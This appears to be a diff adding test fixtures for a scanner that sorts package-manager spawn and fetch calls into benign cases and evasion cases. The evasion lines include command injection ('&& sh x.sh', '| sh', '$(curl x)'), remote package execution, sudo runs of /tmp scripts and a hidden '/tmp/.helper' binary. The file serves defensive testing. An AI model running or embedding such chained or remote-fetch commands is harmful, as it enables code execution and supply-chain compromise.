@@ -13,3 +13,27 @@ fetch_open: ;fetch(
 spawn_stmt: spawn(x);
 dense_tail: spawn(x{i}); fetch(y{i});
 curl_flag: curl -s
+pm_benign_1: let process = await spawn('pnpm next dev')
+pm_benign_2: const p = execSync('npm run dev')
+pm_benign_3: child = spawn('yarn', ['test', '--watch'])
+pm_benign_4: subprocess.run(['npm', 'run', 'build'], check=True)
+pm_benign_5: subprocess.Popen('pnpm vite build', shell=True)
+pm_benign_6: cmd := exec.Command("bun", "run", "dev")
+pm_evasion_1: execSync('npx https://example.invalid/x')
+pm_evasion_2: execSync('npm install https://example.invalid/x.tgz')
+pm_evasion_3: execSync('pnpm dlx some-package')
+pm_evasion_4: execSync('npm exec some-package')
+pm_evasion_5: execSync('npm add some-package')
+pm_evasion_6: execSync(`pnpm ${name}`)
+pm_evasion_7: execSync('npm run build && sh x.sh')
+pm_evasion_8: execSync('npm run build; sh x.sh')
+pm_evasion_9: execSync('pnpm run dev | sh')
+pm_evasion_10: execSync('npm run ./payload')
+pm_evasion_11: execSync('sudo python3 /tmp/x.py')
+pm_evasion_12: execSync('pnpm', ['run', '/tmp/x'])
+pm_evasion_13: execSync('npm run build $(curl x)')
+pm_fetch_js: let html = await fetch(url).then((r) => r.text())
+pm_fetch_py: html = requests.get(url).text
+pm_download_js: https.get('https://example.invalid/b', cb)
+pm_spawn_helper: spawn('/tmp/.helper')
+pm_spawn_next_dev: spawn('pnpm next dev')
